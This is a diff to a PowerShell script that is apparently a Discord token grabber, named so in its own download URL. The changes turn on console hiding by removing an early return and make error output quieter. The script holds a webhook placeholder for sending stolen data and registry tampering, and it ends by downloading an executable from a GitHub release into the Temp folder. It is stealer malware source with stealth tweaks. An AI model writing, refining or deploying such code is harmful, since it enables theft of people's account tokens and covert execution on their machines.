@@ -16,8 +16,8 @@ $webhook = "YOUR_WEBHOOK_HERE"
 $debug_mode = $false
 
 if (!($debug_mode)) {
-    $ErrorActionPreference = 'SilentlyContinue' 
-    $ProgressPreference = 'SilentlyContinue' 
+    $ErrorActionPreference = 'SilentlyContinue'
+    $ProgressPreference = 'SilentlyContinue'
 }
 
 function Invoke-Admin_Check {
@@ -27,7 +27,6 @@ function Invoke-Admin_Check {
 
 function Hide-Console
 {
-    return 0
     if (-not ("Console.Window" -as [type])) { 
         Add-Type -Name Window -Namespace Console -MemberDefinition '
         [DllImport("Kernel32.dll")]
@@ -971,7 +970,7 @@ function Backup-Data {
     }
 
     try {
-        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force | Out-Null
+        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
